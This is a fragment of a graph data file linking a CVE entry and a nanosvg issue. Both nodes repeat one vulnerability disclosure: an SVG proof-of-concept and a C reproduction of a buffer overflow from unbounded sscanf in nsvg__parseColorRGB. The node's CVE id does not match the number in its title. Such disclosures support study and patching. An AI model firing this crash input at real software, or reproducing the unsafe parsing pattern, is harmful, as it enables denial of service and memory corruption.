    <node id="CVE-2019-1010258">
      <data key="d0">CVE</data>
      <data key="d1">c</data>
      <data key="d2">CVE-2019-1000032 - Memory corruption bug in nsvg__parseColorRGB</data>
      <data key="d3">This simple Proof of Concept

```svg
&lt;stop style="stop-color:rgb(0%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%)"/&gt;

```

crashes nanosvg.
In this snippet it is clear why this happens:

```c
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

static unsigned int nsvg__parseColorRGB(const char* str)
{
	int r = -1, g = -1, b = -1;
	char s1[32]="", s2[32]="";
	sscanf(str + 4, "%d%[%%, \t]%d%[%%, \t]%d", &amp;r, s1, &amp;g, s2, &amp;b);
	if (strchr(s1, '%')) {
		return 1;
	} else {
		return 0;
	}
}

int main(int argc, char const *argv[])
{
	printf("%d\n", nsvg__parseColorRGB("rgb(0%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%)"));
	return 0;
}
```

sscanf tries to parse the string, and writes arbitrary number of '%' or '\t' into the s1 or s2 buffer. The buffer overflows and triggers a segfault. This could lead to memory corruption and/or denial of service.

Regards
bitwave

CC: @gehaxelt for the fuzzing</data>
    </node>
    <node id="memononen/nanosvg#136">
      <data key="d0">Issue</data>
      <data key="d2">CVE-2019-1000032 - Memory corruption bug in nsvg__parseColorRGB</data>
      <data key="d3">This simple Proof of Concept

```svg
&lt;stop style="stop-color:rgb(0%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%)"/&gt;

```

crashes nanosvg.
In this snippet it is clear why this happens:

```c
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

static unsigned int nsvg__parseColorRGB(const char* str)
{
	int r = -1, g = -1, b = -1;
	char s1[32]="", s2[32]="";
	sscanf(str + 4, "%d%[%%, \t]%d%[%%, \t]%d", &amp;r, s1, &amp;g, s2, &amp;b);
	if (strchr(s1, '%')) {
		return 1;
	} else {
		return 0;
	}
}

int main(int argc, char const *argv[])
{
	printf("%d\n", nsvg__parseColorRGB("rgb(0%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%)"));
	return 0;
}
```

sscanf tries to parse the string, and writes arbitrary number of '%' or '\t' into the s1 or s2 buffer. The buffer overflows and triggers a segfault. This could lead to memory corruption and/or denial of service.

Regards
bitwave

CC: @gehaxelt for the fuzzing</data>
